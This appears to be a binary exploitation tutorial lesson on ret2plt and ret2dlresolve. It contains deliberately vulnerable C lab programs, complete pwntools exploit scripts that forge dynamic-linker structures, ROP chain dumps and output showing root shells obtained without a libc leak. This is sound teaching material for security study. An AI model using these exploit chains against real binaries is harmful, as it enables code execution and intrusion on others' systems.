---
title: "Lesson 8.2: ret2plt and ret2dlresolve"
image:
  path: /assets/img/covers/pwn-8-2-ret2plt-ret2dlresolve.webp
  alt: "ret2plt and ret2dlresolve"
date: 2022-12-12 00:39:00 +0700
categories: ["Binary Exploitation", "Pwn · GOT and PLT"]
tags: [pwn, plt, dynamic-linker, rop]
render_with_liquid: false
---

The previous lessons leaked libc first and then called `system`. But sometimes you cannot leak anything at all: no print function, no GOT read bug. This lesson gives two moves for that situation. ret2plt: call a function that already has a PLT entry without ever knowing the libc base. ret2dlresolve: when the binary still has lazy binding, force the dynamic linker itself to resolve `system` for you using forged structures. Both run live on a No-PIE Ubuntu 24.04 binary.

![ret2plt calling system through a fixed PLT stub, ret2dlresolve forging a relocation](/assets/img/pwn/pwn-8-2-ret2plt-ret2dlresolve.svg)
_ret2plt reuses a PLT entry the binary already has. ret2dlresolve forges Elf64_Rela and Elf64_Sym so the resolver finds "system" for you._

**Prerequisites:** Lesson 1.3 (PLT/GOT, lazy binding, `_dl_runtime_resolve`), Lesson 6.1 (ret2libc, alignment), Lesson 6.3 (ROP chains), Lesson 3.3 (pop rdi gadget).

**Tools:** pwntools (`ROP`, `Ret2dlresolvePayload`), ROPgadget, gdb + pwndbg, readelf, objdump, checksec.

## Goals

By the end you can call a function via a PLT stub when libc cannot be leaked (ret2plt), understand lazy binding and `_dl_runtime_resolve` well enough to abuse them, forge an Elf64_Rela / Elf64_Sym / function-name string to force the resolution of `system` (ret2dlresolve), know exactly when each applies (dynamic, No-PIE, lazy binding), and run pwntools' `Ret2dlresolvePayload` for real on glibc 2.39.

## Theory

### Part A: ret2plt, calling a function through the PLT when there is nothing to leak

Recall Lesson 1.3: when a binary uses a libc function, it gets a stub in the PLT and an entry in the GOT. The PLT stub is at a FIXED address inside the binary (with No-PIE), and lazy binding at runtime decides where that stub actually jumps. The consequence: you can call `func@plt` WITHOUT ever knowing where `func` sits in libc. The PLT is a stable door that always leads to the right function.

ret2plt exploits exactly this. If the binary already imports a useful function (for example `system`) and the binary's `.rodata` already has a `/bin/sh` string, then even with ASLR on and nothing leaked, you can still call `system("/bin/sh")` using a chain like this one.

```
[ saved RIP ] -> pop rdi ; ret
             -> &"/bin/sh"   (already present in the binary's .rodata)
             -> system@plt    (fixed address in the binary, PLT resolves itself)
```

The core requirement for ret2plt: the target function must already be imported by the binary (it must have a PLT entry). If the binary never calls `system` anywhere, there is no `system@plt`, and ret2plt with `system` is impossible. That is exactly when ret2dlresolve, part B, comes in.

ret2plt has another use you already met in Lesson 6.2: calling `puts@plt(puts@got)` to leak libc. There, ret2plt is the leaking step. Here we use it to call a dangerous function that already exists.

### Part B: ret2dlresolve, letting the linker resolve it for you

A harder situation: the binary is No-PIE, has no `system@plt`, no `/bin/sh` string, and no function to leak libc with. It looks like a dead end. But if the binary still has lazy binding, there is a way around it: force `ld.so`'s own `_dl_runtime_resolve` to resolve `system` to its libc address and call it, all without ever knowing the libc base.

Recall lazy binding (Lesson 1.3). The first time a not-yet-resolved function is called, the PLT stub runs roughly this sequence.

```
func@plt:
  jmp [func@got]       ; first call: GOT entry still points at the resolver stub below
  push reloc_index     ; push the relocation INDEX for func onto the stack
  jmp PLT[0]           ; jump to _dl_runtime_resolve(link_map, reloc_index)
```

`_dl_runtime_resolve(link_map, reloc_index)` processes `reloc_index` in three steps.

1. Takes the `reloc_index`-th `Elf64_Rela` structure in `.rela.plt`. That Rela has `r_offset` (the GOT entry to fill) and `r_info` (which holds a symbol index).
2. From the symbol index, it fetches the `Elf64_Sym` in `.dynsym`. That Sym has `st_name`, an offset into `.dynstr` pointing at the function name string, for example `"system"`.
3. It looks up that name in libc, finds the real address, WRITES it into the `r_offset` GOT entry, then jumps into the function.

The gap is that `reloc_index`, `Elf64_Rela`, `Elf64_Sym`, and the name string are all data the resolver TRUSTS. If we control a writable region at a fixed address (for example `.bss` in a No-PIE binary), we can do the following.

- Place a forged `Elf64_Rela`, a forged `Elf64_Sym`, and the strings `"system\0"` and `"/bin/sh\0"` there.
- Choose a large `reloc_index` that falls outside the real `.rela.plt` and lands exactly on our forged Rela.
- Jump into `PLT[0]` with that `reloc_index` on the stack.

The resolver follows our forged pointers, reads the name `"system"`, resolves it to a libc address, and calls `system` with the argument we already set up (rdi = `&"/bin/sh"`). We never leaked a single byte of libc.

### Conditions, stated precisely

ret2dlresolve only works when all of the following hold.

- The binary is DYNAMIC (dynamically linked) and still has LAZY BINDING. Lazy binding goes together with Partial RELRO. Under Full RELRO there is no more lazy-style `_dl_runtime_resolve` (the GOT is resolved up front at load and locked read-only), so ret2dlresolve fails.
- No-PIE is ideal, because we need a FIXED writable address (`.bss`) to place the forged structures, and a fixed `PLT[0]` address to jump to. With PIE you must leak the image base first, which defeats the "no leak needed" advantage.
- There is a write stage available, usually another `read` call inside the ROP chain to load the forged structures into `.bss`.

A common misconception worth correcting: many write-ups say ret2dlresolve "is for static binaries". That is wrong. A STATICALLY linked binary has no dynamic linker, no `_dl_runtime_resolve` to abuse, so ret2dlresolve does not apply there at all; for static binaries you use ret2syscall or SROP (Lesson 6.3). ret2dlresolve is really a move for DYNAMIC, No-PIE binaries with lazy binding, when you CANNOT leak libc. The "no-leak" part is what defines it, not "static".

### A note on glibc 2.39

Modern glibc tightens `_dl_runtime_resolve`: if the binary has `.gnu.version` (DT_VERSYM), the resolver uses the symbol index to look into a version table, so a careless `reloc_index` can make it read garbage version data and crash. Our demo binary DOES have DT_VERSYM (`readelf -d` shows `VERSYM 0x4004cc`). The good news: the current pwntools `Ret2dlresolvePayload` already lays things out to work around the version table issue, and it RUNS FOR REAL on glibc 2.39 in the lab below. You do not have to build the structures by hand, but it helps to understand why this can be tricky.

One more detail on modern glibc: `system` uses an SSE `movaps` instruction that requires rsp aligned to 16 bytes. After the resolver tail-calls into `system`, the stack can be off by 8 bytes and crash. The familiar fix from Lesson 6.1 applies: insert a `ret` gadget to round rsp up. The lab below needs exactly one such `ret`.

## Demo

Test environment: Ubuntu 24.04.4, glibc 2.39, gcc 13.3.0. Both binaries: No PIE, No canary, NX enabled, Partial RELRO. Compile for Partial RELRO to keep lazy binding, using a command like the one below; the actual build script is in the Lab section below.

```bash
gcc -fno-stack-protector -no-pie -fcf-protection=none -z relro -z lazy -O0 -g -o <bin> <src>.c
```

Note: gcc 13 No-PIE no longer ships a ready `pop rdi ; ret` like older binaries. To keep both labs focused on the GOT/PLT technique rather than gadget hunting, each source adds a small gadget block through inline asm (`pop rdi/rsi/rdx ; ret`), which ROPgadget and pwntools find normally, as shown below.

```
$ ROPgadget --binary dlresolve | grep -E 'pop rd. ; ret|pop rsi ; ret'
0x0000000000401146 : pop rdi ; ret
0x0000000000401148 : pop rsi ; ret
0x000000000040114a : pop rdx ; ret
```

### Part A: ret2plt

The core part of source `ret2plt.c` has an overflowing `vuln`, plus one unreachable `system("/bin/sh")` call that forces the linker to import `system@plt` and keep the `/bin/sh` string.

```c
void vuln(void){ char buf[64]; read(0, buf, 256); }   // overflow saved RIP
int main(void){
    setvbuf(stdout, NULL, _IONBF, 0);
    puts("== ret2plt demo ==");
    if (getpid() == 0) system("/bin/sh");   // never runs, exists only to get system@plt + the string
    vuln();
}
```

A quick check confirms the binary has exactly the two things ret2plt needs.

```
$ objdump -d -M intel -j .plt ret2plt | grep -A1 system@plt
0000000000401050 <system@plt>: jmp QWORD PTR [rip+0x2fba]  # 404010 <system@GLIBC_2.2.5>
# system@plt = 0x401050 ; /bin/sh string lives at 0x402017
```

The exploit (`exploit_ret2plt.py`) needs no leaking at all.

```python
context.binary = elf = ELF('./ret2plt')
OFFSET = 72                                    # buf[64] + saved rbp(8)
io = process('./ret2plt'); io.recvuntil(b'demo ==\n')

rop     = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]
binsh   = next(elf.search(b'/bin/sh\x00'))      # string in the binary
payload = flat(
    b'A' * OFFSET,
    ret,                     # 16-byte alignment before system (movaps)
    pop_rdi, binsh,
    elf.plt['system'],       # system@plt, fixed address, resolves itself via PLT
)
io.sendline(payload)
io.interactive()
```

Running it for real produces this output, captured from the transcript.

```
[*] pop rdi    = 0x401166
[*] /bin/sh    = 0x402017
[*] system@plt = 0x401050
===PWNED_8_2_PLT===
uid=0(root) gid=0(root) groups=0(root)
[+] ret2plt OK: system@plt("/bin/sh") got a shell, no libc leak needed
```

### Part B: ret2dlresolve

Source `dlresolve.c` has NO `system`, NO `/bin/sh`, just a `read` (overflow) and `puts`, so there is nothing to leak at all.

```c
void vuln(void){ char buf[64]; read(0, buf, 0x200); }   // overflow, room for the ROP chain
int main(void){
    setvbuf(stdout, NULL, _IONBF, 0);
    puts("== ret2dlresolve demo ==");
    vuln();
}
```

Confirming the binary qualifies for ret2dlresolve, it has `.rela.plt`, `.dynsym`, `.dynstr`, and still has lazy binding (Partial RELRO).

```
$ readelf -SW dlresolve | grep -E 'rela.plt|dynsym|dynstr'
[ 6] .dynsym   DYNSYM  00000000004003c8 ...
[ 7] .dynstr   STRTAB  0000000000400470 ...
[11] .rela.plt RELA    0000000000400558 ...
$ readelf -dW dlresolve | grep -E 'JMPREL|SYMTAB|STRTAB|VERSYM'
JMPREL 0x400558   SYMTAB 0x4003c8   STRTAB 0x400470   VERSYM 0x4004cc
```

This is where pwntools helps a lot, since `Ret2dlresolvePayload` computes the entire forged Rela/Sym/string blob and the resolve index.

```python
context.binary = elf = ELF('./dlresolve')
OFFSET = 72
io = process('./dlresolve'); io.recvuntil(b'demo ==\n')

dl = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop = ROP(elf)
rop.raw(rop.find_gadget(['ret'])[0])          # 16-byte alignment for system
rop.read(0, dl.data_addr, len(dl.payload))    # stage 1: load the forged blob into .bss
rop.ret2dlresolve(dl)                          # stage 2: force the resolve of system
payload = fit({OFFSET: rop.chain()})

io.send(payload)
time.sleep(0.3)                  # wait for vuln's read to return, so stage 1 is not swallowed
io.send(dl.payload)              # the data read into data_addr
io.interactive()
```

The exploit uses a two-stage flow. Stage 1's chain calls `read(0, data_addr, len)` to load the forged structure blob into `.bss` at `data_addr`, then stage 2's `ret2dlresolve` sets rdi = `&"/bin/sh"` (inside the blob) and jumps into `PLT[0]` with the forged relocation index. pwntools prints the exact chain it built below.

```
[*] data_addr      = 0x404e00
[*] dl payload len = 80
[*] ROP chain:
    0x0000:  0x40101a ret                 <- alignment
    0x0008:  0x40114a pop rdx; ret
    0x0010:      0x50 [arg2] rdx = 80
    0x0018:  0x401148 pop rsi; ret
    0x0020:  0x404e00 [arg1] rsi = data_addr
    0x0028:  0x401146 pop rdi; ret
    0x0030:       0x0 [arg0] rdi = 0
    0x0038:  0x401040 read                <- stage 1: read(0, data_addr, 80)
    0x0040:  0x401146 pop rdi; ret
    0x0048:  0x404e48 [arg0] rdi = &"/bin/sh" (inside the blob)
    0x0050:  0x401020 [plt_init] system    <- jumps into PLT[0]
    0x0058:     0x309 [dlresolve index]    <- the forged relocation index
```

The result of running it for real on glibc 2.39, from the transcript, is this.

```
===PWNED_8_2_DL===
uid=0(root) gid=0(root) groups=0(root)
[+] ret2dlresolve OK: forced _dl_runtime_resolve to call system("/bin/sh")
```

That `0x309` is the forged `reloc_index` that pwntools computes so it lands exactly on the forged `Elf64_Rela` in the blob, while also respecting glibc 2.39's DT_VERSYM check. Every address used in this chain is a fixed No-PIE binary address, and not one byte of libc was ever leaked.

## Lab

<div class="lab-box">
<div class="lab-head"><b>LAB 8.2</b>Download the lab files</div>
<div class="lab-files">
<a class="lab-file lab-all" href="/assets/labs-pwn/8.2.zip" download><i class="fa-solid fa-file-zipper"></i>Download all (.zip)</a>
<a class="lab-file" href="/assets/labs-pwn/8.2/build.sh" download><i class="fa-solid fa-file-code"></i>build.sh</a>
<a class="lab-file" href="/assets/labs-pwn/8.2/dlresolve.c" download><i class="fa-solid fa-file-code"></i>dlresolve.c</a>
<a class="lab-file" href="/assets/labs-pwn/8.2/exploit_dlresolve.py" download><i class="fa-solid fa-file-code"></i>exploit_dlresolve.py</a>
<a class="lab-file" href="/assets/labs-pwn/8.2/exploit_ret2plt.py" download><i class="fa-solid fa-file-code"></i>exploit_ret2plt.py</a>
<a class="lab-file" href="/assets/labs-pwn/8.2/ret2plt.c" download><i class="fa-solid fa-file-code"></i>ret2plt.c</a>
</div>
</div>

- Challenge: two binaries, provided in the Lab section below. `ret2plt` (has `system@plt` and `/bin/sh`) and `dlresolve` (has nothing to leak, no `system`). Both No-PIE, Partial RELRO.
- Goal: get a shell on both WITHOUT leaking libc.
- Hints, in order:
  - Hint 1 (ret2plt): find `system@plt` with `elf.plt['system']` and `/bin/sh` with `elf.search`. Chain: `ret ; pop rdi ; &binsh ; system@plt`.
  - Hint 2 (dlresolve): use `Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])`. Build the chain `read(0, dl.data_addr, len)` then `rop.ret2dlresolve(dl)`.
  - Hint 3: crashing inside `system`? Insert a `ret` for alignment. Stage 1 getting swallowed? Add a small delay between the two sends.
  - Self-check: can you explain "why ret2plt needs a function that already has a PLT entry" and "why ret2dlresolve dies under Full RELRO"?

## Key takeaways

- ret2plt: call `func@plt` (a fixed address) without knowing the libc base, as long as the binary already imports `func`.
- No `system@plt` and nothing to leak: think ret2dlresolve.
- ret2dlresolve forges an Elf64_Rela plus an Elf64_Sym plus a name string, forcing `_dl_runtime_resolve` to resolve a function.
- Conditions: dynamic, No-PIE, lazy binding (Partial RELRO). Not "static".
- Full RELRO kills ret2dlresolve (no more lazy resolving, GOT locked).
- pwntools' `Ret2dlresolvePayload` handles the forged structures and works on glibc 2.39.
- Remember one `ret` for alignment before `system` runs.

## Common pitfalls

- Using ret2plt for a function the binary does not have. No `system@plt` means `elf.plt['system']` errors out. Switch to ret2dlresolve.
- Thinking ret2dlresolve is for static binaries. Static binaries have no dynamic linker. ret2dlresolve is for DYNAMIC, lazy-binding, no-leak binaries.
- Running this against Full RELRO. Lazy binding is off and `_dl_runtime_resolve` no longer follows the old path. `checksec` must show `Partial RELRO`.
- Forgetting alignment. The chain is otherwise correct but SIGSEGVs right at the start of `system`'s `movaps`. Add one `ret`. This lab needs exactly one.
- Stage 1 swallowed by the first `read`. If the payload and `dl.payload` are sent together, the overflowing `read` can consume both. Send the payload first, pause briefly, then send `dl.payload`.
- `data_addr` not writable, or overlapping memory still in use. pwntools defaults to `.bss`, but if you pick it yourself it must be in a `rw-` segment.
- PIE. A PIE binary randomizes `.bss` and `PLT[0]` too, losing the "no leak needed" property. You would have to leak the image base before even considering dlresolve.

## Further reading

- Lesson 1.3: `_dl_runtime_resolve` and lazy binding, worth re-reading carefully before building a dlresolve chain by hand.
- pwntools docs: `pwnlib.rop.ret2dlresolve.Ret2dlresolvePayload`, read up on the `data_addr`, `symbol`, `args` parameters.
- "Return to dl-resolve" write-ups on various pwn blogs (for example CTF team series), and the dlresolve chapter on pwn.college.
- Lesson 6.2 (leaking libc through the GOT) for comparison: once you can leak, ret2libc is much simpler, and dlresolve is the move when leaking is blocked.
- how2heap and SROP for static binaries (where dlresolve does not apply).
